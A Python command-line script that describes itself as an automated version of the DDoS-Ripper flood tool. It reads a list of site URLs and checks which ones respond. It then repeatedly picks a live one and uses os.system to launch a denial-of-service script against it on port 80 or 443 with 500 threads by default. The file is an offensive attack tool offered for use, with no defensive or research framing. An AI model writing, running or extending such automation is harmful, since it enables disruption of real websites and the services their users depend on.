import os
import random
import time
import argparse
from sys import argv

from working_sites import get_working_sites

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='An automated version of DDoS-Ripper. Takes a path to the file with '
                                                 'links and chooses working ones only.')
    parser.add_argument('source', type=str, action='store', metavar='SOURCE',
                        help='A path to the file containing the links to sites (one link per line)')
    # parser.add_argument('--request-timeout', type=int, action='store', default=5,
    #                     help='A request timeout in seconds when requesting sites. By default, 5')
    parser.add_argument('-c', '--command', type=str, action='store', default='python3',
                        help='Python command to run the script. If the default command does not work, try adding -c '
                             '{command that you use to run python script, e.g. python3.8}. By default, python3')
    parser.add_argument('-t', '--threads', type=int, action='store', default=500,
                        help='A quantity of threads that will run simultaneously. By default, 500')

    if len(argv) == 1:
        parser.print_help()
        exit()

    args = parser.parse_args(argv[1:])
    PATH = args.source

    if not os.path.exists(PATH):
        print("The file does not exist: %s" % PATH)
        parser.print_help()
        exit(1)

    urls = [u for u in open(PATH, 'r', encoding='utf-8').readlines() if not u.strip().startswith('#')]

    while True:
        print("Getting new list of working sites")
        sites_available = get_working_sites(urls.copy())
        print(sites_available)
        if len(sites_available) > 0:
            target: str = random.choice(sites_available)
            if target.endswith('/'):
                target = target[:-1]
            command = f'{args.command} _unpacked.py -s {target.replace("https://", "").replace("http://", "")}' \
                      + f' -p {"443" if target.startswith("https") else "80"} -t {args.threads}'
            print(command)
            os.system(command)
        else:
            print("No sites available. Waiting 10 seconds.")
            time.sleep(10)
